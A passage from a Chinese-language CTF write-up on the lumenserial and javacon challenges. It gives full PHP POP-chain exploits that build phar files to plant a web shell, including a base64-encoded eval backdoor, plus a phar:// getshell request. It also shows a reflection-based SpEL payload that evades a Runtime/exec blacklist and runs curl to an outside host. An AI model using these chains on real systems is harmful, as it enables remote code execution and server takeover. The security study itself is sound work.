rel="noopener">《PHP反序列化入门之寻找POP链(一)》</a><br>PS:但是文中对第三种的分析存在一些问题，可以参考我的表述</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>总结起来以上四种类型要么是利用调用<code>dispatch</code>来完成，要么是利用<code>$this-&gt;events</code>中的<code>__call</code>完成。</p><h3 id="3-POP-chain的构造"><a href="#3-POP-chain的构造" class="headerlink" title="3. POP chain的构造"></a>3. POP chain的构造</h3><p>pop chain的构造一般都是从寻找<code>__wakeup</code> 或者 <code>__destruct</code>开始的<br>寻找思路: </p><ol><li>找<code>dispatch</code>完成合适的函数调用</li><li><p>寻找合适的<code>$this-&gt;events</code>来使用其中的<code>__call</code></p><h4 id="chain-1"><a href="#chain-1" class="headerlink" title="chain 1"></a>chain 1</h4></li><li><p>入口点  cat/vendor/illuminate/broadcasting/PendingBroadcast.php <code>__destruct()</code></p></li><li>cat/vendor/fzaninotto/faker/src/Faker/ValidGenerator.php <code>__call($name, $arguments)</code><br>在这其中call_user_func_array函数的返回结果作为call_user_func函数的参数，$this-&gt;validator又是可控的，进而call_user_func函数的参数均是可控的。但是想用file_put_contents函数来写shell需要两个参数，所以call_user_func不能够直接使用，需要继续寻找一个call_user_func_array函数来用</li><li>cat/vendor/phpunit/phpunit/src/Framework/MockObject/Stub/ReturnCallback.php <code>invoke(Invocation $invocation)</code>函数存在一个call_user_func_array函数，其中第一个参数可控，第二个参数需要Invocation对象</li><li>cat/vendor/phpunit/phpunit/src/Framework/MockObject/Invocation/StaticInvocation.php 中找到对接口<code>Invocation</code>的实现</li></ol><p>最终构造出的poc如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">       <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">       <span class="keyword">protected</span> $event;</span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">       <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $generator;</span><br><span class="line">       <span class="keyword">protected</span> $validator;</span><br><span class="line">       <span class="keyword">protected</span> $maxRetries;</span><br><span class="line">       <span class="comment">// __call方法中有call_user_func_array、call_user_func</span></span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($generator, $validator = null, $maxRetries = <span class="number">10000</span>)</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;generator = $generator;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;validator = $validator;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;maxRetries = $maxRetries;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">ReturnCallback</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback)</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line">       <span class="title">private</span> $<span class="title">parameters</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parameters)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">   $function = 'file_put_contents';</span><br><span class="line">   $parameters = <span class="keyword">array</span>(<span class="string">'/var/www/html/11.php'</span>,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">   $staticinvocation = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</span><br><span class="line">   $returncallback = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback($function);</span><br><span class="line">   $defaultgenerator = <span class="keyword">new</span> Faker\DefaultGenerator($staticinvocation);</span><br><span class="line">   $validgenerator = <span class="keyword">new</span> Faker\ValidGenerator($defaultgenerator,<span class="keyword">array</span>($returncallback,<span class="string">'invoke'</span>),<span class="number">2</span>);</span><br><span class="line">   $pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($validgenerator,<span class="number">123</span>);</span><br><span class="line">   $o = $pendingbroadcast;</span><br><span class="line">   $filename = <span class="string">'poc.phar'</span>;<span class="comment">// 后缀必须为phar，否则程序无法运行</span></span><br><span class="line">   file_exists($filename) ? unlink($filename) : <span class="keyword">null</span>;</span><br><span class="line">   $phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">   $phar-&gt;startBuffering();</span><br><span class="line">   $phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">   $phar-&gt;setMetadata($o);</span><br><span class="line">   $phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">   $phar-&gt;stopBuffering();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>poc执行过程分析</p><ol><li><p>起始点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$validgenerator = <span class="keyword">new</span> Faker\ValidGenerator($defaultgenerator,<span class="keyword">array</span>($returncallback,<span class="string">'invoke'</span>),<span class="number">2</span>);</span><br><span class="line">$pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($validgenerator,<span class="number">123</span>);</span><br></pre></td></tr></table></figure></li><li><p>可以看到首先也是进入到了<strong>destruct()，将dispatch作为函数调用进行了使用，但是ValidGenerator类中没有这个函数，所以就调用</strong>call，参数为dsipatch和123。此处要注意到ValidGenerator的几个参数分别是<code>$defaultgenerator,array($returncallback,&#39;invoke&#39;),2</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$parameters = <span class="keyword">array</span>(<span class="string">'/var/www/html/11.php'</span>,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">$staticinvocation = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</span><br><span class="line">$defaultgenerator = <span class="keyword">new</span> Faker\DefaultGenerator($staticinvocation);</span><br></pre></td></tr></table></figure></li></ol><p>因此下面这句中的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;generator, $name), $arguments);</span><br></pre></td></tr></table></figure></p><p><code>array($this-&gt;generator, $name)</code>实际上就是执行了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Faker\DefaultGenerator($staticinvocation)-&gt;dispatch</span><br></pre></td></tr></table></figure></p><p>但是DefaultGenerator中也没有dispatch函数吗，因此就调用<strong>call函数来处理，他的</strong>call函数是直接将$staticinvocation的值进行返回</p><ol start="3"><li><code>new PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</code> 是一个实例化后的Invocation对象，并且它可以给出我们需要参数array，也就是<code>$res = 这个对象</code></li><li>接下来回到$validgenerator = new Faker\ValidGenerator($defaultgenerator,array($returncallback,’invoke’),2);继续看其中的<code>call_user_func($this-&gt;validator, $res)</code>这里的<code>$this-&gt;validator</code>其实就是<code>array($returncallback,&#39;invoke&#39;)</code>，整体对应的含义如下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback($function)-&gt;invoke($res);</span><br></pre></td></tr></table></figure></li></ol><p>invoke的函数定义如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invoke</span><span class="params">(Invocation $invocation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到$res变量所对应的对象在此处将取出我们需要的$parameters，而$this-&gt;callback就是我们之前设置的$function</p><h4 id="chain-2"><a href="#chain-2" class="headerlink" title="chain 2"></a>chain 2</h4><p>这个pop chain出自lemon师傅，只这条相较于上条答题相同但是比较绕，我在注释已经做了详细的解释。<br>参考:<br><a href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#%E5%AF%BB%E6%89%BEPOP-Chain" target="_blank" rel="noopener">《lumenserial–kingkk》</a><br><a href="https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html#_label0" target="_blank" rel="noopener">《lumenserial-l3m0n》</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $generator;</span><br><span class="line">        <span class="keyword">protected</span> $validator;</span><br><span class="line">        <span class="keyword">protected</span> $maxRetries;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($generator, $validator, $maxRetries = <span class="number">10000</span>)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = $generator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = $validator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = $maxRetries;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>($<span class="title">parameters</span>)&#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">parameters</span> = $<span class="title">parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ReturnCallback</span>&#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>($<span class="title">callback</span>)&#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">callback</span> = $<span class="title">callback</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp func call</span></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">function</span> = "<span class="title">file_put_contents</span>";</span><br><span class="line">    $parameters = [<span class="string">"/var/www/html/upload/z.php"</span>, base64_decode(<span class="string">"PD9waHAgZXZhbCgkX0dFVFsnMTEnXSk7Pz4="</span>)];</span><br><span class="line">    </span><br><span class="line">    $exp_call_obj = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback($function);</span><br><span class="line"></span><br><span class="line">    $exp_args_obj = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</span><br><span class="line">    $tmp_arr = [<span class="string">"gogogo"</span> =&gt; $exp_args_obj];</span><br><span class="line">    $s4_obj = <span class="keyword">new</span> Faker\Generator($tmp_arr);</span><br><span class="line">    <span class="comment">// 第一次使用Generator来得到dispatch对应的内容</span></span><br><span class="line">    $get_func_arr = <span class="keyword">array</span>(<span class="string">"dispatch"</span>=&gt; <span class="keyword">array</span>($s4_obj, <span class="string">"getFormatter"</span>));</span><br><span class="line">    <span class="comment">// 最终将会返回 array($s4_obj, "getFormatter")</span></span><br><span class="line">    $s3_obj = <span class="keyword">new</span> Faker\Generator($get_func_arr);</span><br><span class="line">    <span class="comment">// array($s4_obj, "getFormatter") 进入format()中的call_user_func_array</span></span><br><span class="line">    <span class="comment">// 就可以返回我们gogogo所对应的$exp_args_obj</span></span><br><span class="line">    <span class="comment">// 最终我们需要的$exp_args_obj将会返回给$res</span></span><br><span class="line">    <span class="comment">// 之后$res再invoke()中可以通过$invocation-&gt;getParameters()将$parameters取出</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// $s3_obj对应generator是我们需要控制的类，而这个类中有我们用来控制$res变量的函数</span></span><br><span class="line">    <span class="comment">// array($exp_call_obj,"invoke")会在ValidGenerator中的call_user_func处调用invoke函数</span></span><br><span class="line">    $s2_obj = <span class="keyword">new</span> Faker\ValidGenerator($s3_obj, <span class="keyword">array</span>($exp_call_obj,<span class="string">"invoke"</span>), <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    $s1_obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($s2_obj, <span class="string">"gogogo"</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($s1_obj)).<span class="string">"\n\r\n\r"</span>;</span><br><span class="line">    </span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">'./z.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($s1_obj);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>在此大致做个小结：</p><ol><li>首先，此处禁用了用于执行系统命令的函数，所以不能rce只能想办法getshell，写shell就要用<code>file_put_contents</code>函数，此时就涉及两个参数，所以就必须找<code>call_user_func_array</code>这样的函数来进行调用。</li><li>pop chain的构造对于框架而言是找到一个好的起始点，一般而言是找<code>__wakeup</code>和<code>__destruct</code>，但是框架的起始点和构造思想可以参考phpggc。对与laravel框架而言，就是看使用<code>dispatch</code>还是使用<code>__call</code>(选择的依据就是这两者中会不会涉及到<code>call_user_func_array</code>)。</li></ol><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>在做此题目的时候之所以会想到是反序列漏洞是看如下信息:</p><ol><li><p>首先看框架的路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$router-&gt;get(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br><span class="line">$router-&gt;post(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br></pre></td></tr></table></figure></li><li><p>其次根据路由看<code>Controller</code>，并在<code>Controller</code>中寻找敏感点，比如此处的<code>download</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    $content = file_get_contents($url);</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure></li><li><p>查看url参数是否可控，是否过滤，那么就查看一下这个函数的调用点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doCatchimage</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sources = $request-&gt;input(<span class="keyword">$this</span>-&gt;config[<span class="string">'catcherFieldName'</span>]);</span><br><span class="line">    $rets = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($sources) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($sources <span class="keyword">as</span> $url) &#123;</span><br><span class="line">            $rets[] = <span class="keyword">$this</span>-&gt;download($url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>继续跟进<code>config[&#39;catcherFieldName&#39;]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;catcherFieldName&quot;: &quot;source&quot;, /* 提交的图片列表表单名称 */</span><br></pre></td></tr></table></figure></li><li><p>可以看到路径上无过滤，因此参数可控，可以在这个点使用phar来getshell，进而就有了上面的pop chain构造</p></li><li>getshell<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/78ed78f65afaa8137864b4839f2076a8/201904/14/9a032ef2cab676e1f622.gif</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://i.loli.net/2020/06/04/8FTaxUZ2pXgVstD.png" alt="539A5C5E-7729-494B-AD76-2BF98165A8D9.png"></p><p><img src="https://i.loli.net/2020/06/04/2v1Q5BEhLMrf7Wy.png" alt="51E3D681-D424-4298-B85A-5398B9B0684F.png"></p><p>其它pop chain参考 <a href="http://m4p1e.com/web/20181224.html" target="_blank" rel="noopener">《lumenserial–evil》</a></p><h2 id="0x07-javacon"><a href="#0x07-javacon" class="headerlink" title="0x07 javacon"></a>0x07 javacon</h2><h3 id="1-环境配置-1"><a href="#1-环境配置-1" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>使用idea打开这个项目，之后右键jar包选择Add as Library，之后就可以分析其中的源代码了。</p><p><img src="https://i.loli.net/2020/06/04/RWBNjZwgYerDVUv.png" alt="5FC1A049-960A-4451-90BA-F4557B18B826.png"></p><p>配置进行远程调试<br><img src="https://i.loli.net/2020/06/04/do6mDh1Qrb4ZkON.png" alt="9EDB41F3-F006-4004-8FD6-B8B8208658C1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005</span><br></pre></td></tr></table></figure><p>命令启动<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,<span class="built_in">suspend</span>=y -jar challenge-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure></p><p>之后点击DEBUG开始调试</p><h3 id="2-漏洞相关知识点"><a href="#2-漏洞相关知识点" class="headerlink" title="2. 漏洞相关知识点"></a>2. 漏洞相关知识点</h3><h4 id="2-1-EL表达式"><a href="#2-1-EL表达式" class="headerlink" title="2.1 EL表达式"></a>2.1 EL表达式</h4><h4 id="2-2-SpEL表达式注入"><a href="#2-2-SpEL表达式注入" class="headerlink" title="2.2 SpEL表达式注入"></a>2.2 SpEL表达式注入</h4><p>参考：<a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">《由浅入深SpEL表达式注入漏洞》</a></p><h4 id="2-3-反射"><a href="#2-3-反射" class="headerlink" title="2.3 反射"></a>2.3 反射</h4><p>参考：<a href="http://rui0.cn/archives/1112" target="_blank" rel="noopener">《深入理解Java反射中的invoke方法》</a></p><h3 id="3-漏洞调试分析"><a href="#3-漏洞调试分析" class="headerlink" title="3. 漏洞调试分析"></a>3. 漏洞调试分析</h3><p>可以看出是基于Spring框架编写的代码，所以首先查看其配置文件application.yml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  thymeleaf:</span><br><span class="line">    encoding: UTF-8</span><br><span class="line">    cache: false</span><br><span class="line">    mode: HTML</span><br><span class="line">keywords:</span><br><span class="line">  blacklist:</span><br><span class="line">    - java.+lang</span><br><span class="line">    - Runtime</span><br><span class="line">    - exec.*\(</span><br><span class="line">user:</span><br><span class="line">  username: admin</span><br><span class="line">  password: admin</span><br><span class="line">  rememberMeKey: c0dehack1nghere1</span><br></pre></td></tr></table></figure><p>可以看到用户的配置文件中写了一个黑名单和一个用户信息</p><blockquote><p>SmallEvaluationContext 继承 StandardEvaluationContext，主要是提供一个上下文环境，相当于一个容器。<br>ChallengeApplication 用于启动<br>Encryptor 加密解密工具类<br>KeyworkProperties 使用黑名单时需要<br>UserConfig 用户模型，可以看到在RemberMe时使用了Encryptor<br>引用自：<a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">http://rui0.cn/archives/1015</a></p></blockquote><p>主要从MainController开始看其功能实现</p><p><img src="https://i.loli.net/2020/06/04/1cQKxe8DtFWPngT.png" alt="截屏2019-10-15下午10.09.05.png"></p><p>此处的了漏洞主要是SpEL表达式问题，但是因为有黑名单的限制，所以需要利用反射来拼接payload达到绕过的目的。</p><p>常规rce方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)</span><br></pre></td></tr></table></figure></p><p>利用反射拼接的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;curl http://i.zeye.xyz/test&quot;);</span><br></pre></td></tr></table></figure></p><p>PS: 一个坑点，在JAVA中Runtime中exec对复杂一点的linux命令执行不了…我们需要将其参数改成如下才可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new String[]&#123;&quot;/bin/bash\&quot;,&quot;-c&quot;,&quot;xxxxx&quot;&#125;</span><br></pre></td></tr></table></figure><p>之后构造的payload如下<br><figure class="highlight plain"><table><tr><td 